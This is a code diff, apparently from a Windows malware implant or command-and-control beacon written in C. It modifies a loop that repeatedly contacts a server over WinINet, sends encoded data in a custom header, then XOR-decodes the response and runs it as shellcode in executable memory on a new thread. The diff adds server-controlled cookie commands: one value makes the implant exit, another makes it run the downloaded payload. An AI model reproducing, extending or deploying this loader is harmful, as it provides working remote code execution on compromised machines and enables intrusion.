@@ -5,7 +5,6 @@
 
 #pragma comment(lib, "wininet.lib")
 #define delay 5000
-#define MAX_BUFFER 20000
 
 void xor (char *buf, int bufsize);
 int main()
@@ -50,36 +49,54 @@ int main()
         sprintf(header, "X-Session-ID: %s", encoded_data);
         HttpAddRequestHeaders(hRequest, header, strlen(header), HTTP_ADDREQ_FLAG_ADD | HTTP_ADDREQ_FLAG_REPLACE);
         HttpSendRequest(hRequest, NULL, 0, NULL, 0);
-        LPVOID buffer = VirtualAlloc(0, MAX_BUFFER, MEM_COMMIT, PAGE_READWRITE);
+        // Get cookies from the response
+        char cookies[1024];
+        DWORD cookies_len = 1024;
+        HttpQueryInfo(hRequest, HTTP_QUERY_SET_COOKIE, cookies, &cookies_len, NULL);
+
+        CHAR httpFileLenInfo[256];
+        DWORD infoLen = sizeof(httpFileLenInfo);
+        HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, httpFileLenInfo, &infoLen, NULL);
+        DWORD dwFileSize = atoi(httpFileLenInfo);
+        unsigned char *buffer = (unsigned char *)malloc((sizeof(unsigned char) * dwFileSize) + 1);
         DWORD dw_read = 0x00;
-        InternetReadFile(hRequest, buffer, MAX_BUFFER, &dw_read);
+        InternetReadFile(hRequest, buffer, dwFileSize, &dw_read);
         InternetCloseHandle(hRequest);
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
         printf("[+] Request sent\r\n");
         printf("[+] Data: %s\r\n", header);
         printf("[-] Received response of size %d\n", dw_read);
-        printf("[-] Response: %s\r\n", buffer);
         // if the buffer is longer than 80 bytes we assume it is shellcode
-        if (dw_read > 80)
+        if (strlen(cookies) > 0)
         {
-            printf("[-] Received shellcode of size %d\r\n", dw_read);
-            // xor the buffer
-            xor(buffer, dw_read);
-            // execute the shellcode in a new thread
-            DWORD threadId;
-            HANDLE hHandle;
-            DWORD oldProtect = 0x04;
-            LPVOID shellcode = VirtualAlloc(NULL, dw_read, 0x3000, 0x40);
-            printf("[-] Allocated memory at %p\r\n", shellcode);
-            CopyMemory(shellcode, buffer, dw_read);
-            printf("[-] Copied shellcode to memory\r\n");
-            VirtualProtect(shellcode, dw_read, 0x20, &oldProtect);
-            printf("[-] Changed memory protection\r\n");
-            hHandle = CreateThread(NULL, 0, shellcode, NULL, 0, &threadId);
-            printf("[-] Created thread\r\n");
-            WaitForSingleObject(hHandle, INFINITE);
-            printf("[-] Thread finished\r\n");
+            char *cookie_name = strtok(cookies, "=");
+            char *cookie_value = strtok(NULL, ";");
+            if (strcmp(cookie_name, "session") == 0 && strcmp(cookie_value, "kill") == 0)
+            {
+                printf("[+] Killing process\r\n");
+                exit(0);
+            }
+            if (strcmp(cookie_name, "session") == 0 && strcmp(cookie_value, "load") == 0)
+            {
+                printf("[-] Received shellcode of size %d\r\n", dw_read);
+                // xor the buffer
+                xor(buffer, dw_read);
+                // execute the shellcode in a new thread
+                DWORD threadId;
+                HANDLE hHandle;
+                DWORD oldProtect = 0x04;
+                LPVOID shellcode = VirtualAlloc(NULL, dw_read, 0x3000, 0x40);
+                printf("[-] Allocated memory at %p\r\n", shellcode);
+                CopyMemory(shellcode, buffer, dw_read);
+                printf("[-] Copied shellcode to memory\r\n");
+                VirtualProtect(shellcode, dw_read, 0x20, &oldProtect);
+                printf("[-] Changed memory protection\r\n");
+                hHandle = CreateThread(NULL, 0, shellcode, NULL, 0, &threadId);
+                printf("[-] Created thread\r\n");
+                WaitForSingleObject(hHandle, INFINITE);
+                printf("[-] Thread finished\r\n");
+            }
         }
         Sleep(delay);
     }
